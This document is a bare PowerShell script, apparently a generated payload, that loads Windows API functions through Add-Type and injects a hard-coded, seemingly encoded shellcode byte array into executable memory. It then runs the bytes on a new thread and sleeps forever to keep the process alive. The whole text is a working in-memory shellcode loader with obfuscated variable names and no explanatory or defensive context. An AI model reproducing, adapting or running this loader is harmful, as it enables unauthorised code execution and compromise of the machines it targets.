
$PxP = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $PxP -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd7,0xd9,0x74,0x24,0xf4,0xbf,0x2a,0x05,0xce,0x84,0x5e,0x29,0xc9,0xb1,0x57,0x31,0x7e,0x17,0x83,0xee,0xfc,0x03,0x54,0x16,0x2c,0x71,0x54,0xf0,0x32,0x7a,0xa4,0x01,0x53,0xf2,0x41,0x30,0x53,0x60,0x02,0x63,0x63,0xe2,0x46,0x88,0x08,0xa6,0x72,0x1b,0x7c,0x6f,0x75,0xac,0xcb,0x49,0xb8,0x2d,0x67,0xa9,0xdb,0xad,0x7a,0xfe,0x3b,0x8f,0xb4,0xf3,0x3a,0xc8,0xa9,0xfe,0x6e,0x81,0xa6,0xad,0x9e,0xa6,0xf3,0x6d,0x15,0xf4,0x12,0xf6,0xca,0x4d,0x14,0xd7,0x5d,0xc5,0x4f,0xf7,0x5c,0x0a,0xe4,0xbe,0x46,0x4f,0xc1,0x09,0xfd,0xbb,0xbd,0x8b,0xd7,0xf5,0x3e,0x27,0x16,0x3a,0xcd,0x39,0x5f,0xfd,0x2e,0x4c,0xa9,0xfd,0xd3,0x57,0x6e,0x7f,0x08,0xdd,0x74,0x27,0xdb,0x45,0x50,0xd9,0x08,0x13,0x13,0xd5,0xe5,0x57,0x7b,0xfa,0xf8,0xb4,0xf0,0x06,0x70,0x3b,0xd6,0x8e,0xc2,0x18,0xf2,0xcb,0x91,0x01,0xa3,0xb1,0x74,0x3d,0xb3,0x19,0x28,0x9b,0xb8,0xb4,0x3d,0x96,0xe3,0xd0,0xaf,0xcc,0x6f,0x21,0x58,0x78,0xe6,0x4f,0xf1,0xd2,0x90,0xc3,0x76,0xfd,0x67,0x23,0xad,0x30,0xbc,0x88,0x1d,0x60,0x11,0x7c,0xca,0xbc,0xc3,0xfb,0xad,0x3e,0x3e,0xa8,0xe2,0xaa,0xc3,0x1c,0x56,0x43,0x78,0xa3,0x58,0x93,0x96,0x28,0x58,0x93,0x66,0x1e,0x61,0xd1,0x27,0x2a,0xc6,0xd5,0xf7,0xc2,0xbf,0x5c,0x68,0xd4,0xbf,0x8a,0x1f,0x1f,0x6c,0x5d,0x1f,0x92,0x73,0x19,0x4c,0x81,0x20,0x75,0x21,0x73,0xaf,0x92,0x90,0x55,0x14,0x9a,0xcf,0x3c,0x00,0x6e,0xb0,0x28,0x55,0x5d,0x4e,0xa9,0xdc,0x42,0x24,0xad,0x8e,0xe8,0xa7,0xfb,0x46,0x98,0x91,0x9d,0x11,0x9d,0xc8,0xf1,0x4e,0x31,0xa1,0xa3,0x18,0x98,0x43,0x54,0xa2,0x1d,0x9e,0xe1,0x94,0x97,0x2a,0xa5,0x61,0x81,0x42,0xc9,0x3f,0x93,0xc4,0xd6,0x95,0xbe,0xa8,0x40,0x16,0x2f,0x28,0x91,0x7e,0x4f,0x28,0xd1,0x7e,0x1c,0x40,0x89,0xda,0xf1,0x75,0xd6,0xf6,0x65,0x26,0x7a,0x70,0x6e,0x9f,0x14,0x82,0x51,0x1f,0xe5,0xd1,0xc7,0x77,0xf7,0x43,0x6e,0x65,0x08,0xbe,0xf4,0xa9,0x83,0x8c,0x7c,0x2e,0x6d,0xcc,0x06,0xf0,0x18,0x37,0x50,0x33,0xbd,0x5f,0x14,0x4c,0xbd,0x5f,0xef,0x84,0x6c,0x98,0x21,0xc6,0x41,0xeb,0x6f,0x27,0x9b,0x3f,0x70;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$RjZG=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($RjZG.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$RjZG,0,0,0);for (;;){Start-sleep 60};

